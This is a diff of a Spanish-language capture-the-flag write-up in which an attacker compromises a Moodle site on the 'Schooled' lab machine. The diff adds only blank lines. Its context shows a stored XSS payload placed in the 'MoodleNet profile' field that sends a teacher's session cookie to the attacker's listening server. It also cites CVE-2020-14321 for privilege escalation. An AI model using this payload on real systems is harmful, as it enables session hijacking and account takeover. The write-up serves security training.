@@ -71,6 +71,7 @@ Y en este caso, pues el contenido de la pagina web es exactamente el mismo.
 Así que explorando un poco más la pagina, en el apartado "teachers" podemos ver profesores que hacen parte de la institución educativa y su respectivo rol en esta. 
 
 ![teachers](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/teachers.PNG)
+
 De esta forma podemos ver que como atacantes nos interesaria poder acceder a la cuenta de "Lianne Carter" teacher, ya que cuenta con un rol de manager
 
 # Moodle
@@ -107,6 +108,7 @@ Una vez creada la cuenta nos encontraremos con esto:
 ![moodledashboard](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/moodledashboard.PNG)
 
 Si nos dirigimos al apartado de "site home" encontraremos una serie de cursos que se ofrecen en la institución educativa. Revisando cada uno de los cursos podremos ver que solo podemos auto-inscribirnos en el curso de "Mathematics" que dirige el profesor "Manuel Phillips". Así que nos inscribiremos.
+
 # Moodle Foothold
 ****
 ![Announcements](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Announcements.PNG)
@@ -115,12 +117,15 @@ Si nos dirigimos al apartado de "site home" encontraremos una serie de cursos qu
 En la sección "Announcements" del curso "Mathematics" en el que nos inscribimos, podemos ver el anuncio "Reminder for joining students". En este, el profesor nos indica that we need to set our ```"MoodleNet profile"``` y que estara revisando los perfiles de los estudiantes inscritos para verificar que el estudiante haya configurado este campo.
 
 Por lo tanto, yendo a los ajustes del perfil de Moodle podemos ver el campo ```"MoodleNet profile"```
+
 ![moodlenet](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/moodlenet.PNG)
 
 **Pero... ¿que tipo de información debe ir en este campo?**
 Bueno, intentemos escribiendo una palabra de test
 
 ![test](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/test.PNG)
+
+
 Vemos que en nuestro perfil de moodle se muestra:
 
 ![showingtest](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/showingtest.PNG)
@@ -145,15 +150,19 @@ Para esto, utilizaremos el siguiente comando para establecer un servidor web sim
 python3 -m http.server 80
 ```
 ![python3sever](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/python3sever.PNG)
+
 Ahora inyectaremos en el campo ```"MoodleNet profile"``` el siguiente payload que se encargara de robar la cookie de sesión del usuario que ingrese a nuestro perfil de Moodle 
 
 ```sh
 <script>var i=new Image(); i.src="http://[OurIP]/?cookie="+btoa(document.cookie);</script>
 ```
+
 ![cookie](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/cookie.PNG)
+
 
 Podemos ver como se envia a nuestro servidor la cookie de sesión del profesor "Manuel Phillips"
 Sin embargo, esta cookie se encuentra codificada en base64, asi que tenemos que decodificarla:
+
 
 ![stealingcookie](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/stealingcookie.PNG)
 base6
@@ -216,6 +225,7 @@ Es importante mencionar que Moodle cuenta con un apartado de "Security Announcem
 ![moodledate](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/moodledate.PNG)
 
 Así, en la pagina [https://moodle.org/security/] podemos consultar por la fecha de la versión 3.9 de Moodle
+
 ![moodlevuln](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/moodlevuln.PNG)
 
 Así, podemos ver que existe una vulnerabilidad sobre esta versión de Moodle identificada como: **CVE-2020-14321**
@@ -267,6 +277,7 @@ Podemos observar que la solicitud pasa dos parametros de interes:
 
 - **userlist%5B%5D**
 Para revisar la lista de usuarios en el sistema, podemos darnos cuenta que si consultamos nuestro perfil de Moodle (Que en este momento corresponde al del usuario Manuel Phillips). Podemos ver que en la barra del buscador la **"id"** del perfil corresponde a aquella identificada con el numero "24"
+
 ![profileid](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/profileid.PNG)
 
 Si cambiamos este valor en nuestro buscador, por el numero "25" 
